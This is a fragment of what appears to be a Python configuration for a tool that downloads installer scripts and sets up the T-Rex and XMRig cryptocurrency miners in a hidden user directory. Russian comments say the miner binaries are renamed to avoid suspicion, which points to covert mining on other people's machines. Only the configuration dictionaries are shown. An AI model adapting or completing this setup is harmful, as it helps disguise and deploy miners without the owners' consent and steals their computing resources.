...
TREX_CONFIG = {
    "SCRIPT_URL": "https://raw.githubusercontent.com/.../install_trex.sh", # Замени
    "INSTALLER_NAME": "install_trex.sh",
    "BINARY_NAME": "t_rex_inst", # Новое имя, чтобы не было подозрений
...
XMRIG_CONFIG = {
    "SCRIPT_URL": "https://raw.githubusercontent.com/.../install_xmrig.sh", # Замени
    "INSTALLER_NAME": "install_xmrig.sh",
    "BINARY_NAME": "xmr_inst", # Новое имя
    "INSTALL_DIR": os.path.expanduser("~/.local/bin"), # Папка для бинарника
    "LOG_FILE": "xmrig.log",
    "API_PORT": 60001,
    "API_TYPE": "xmrig"
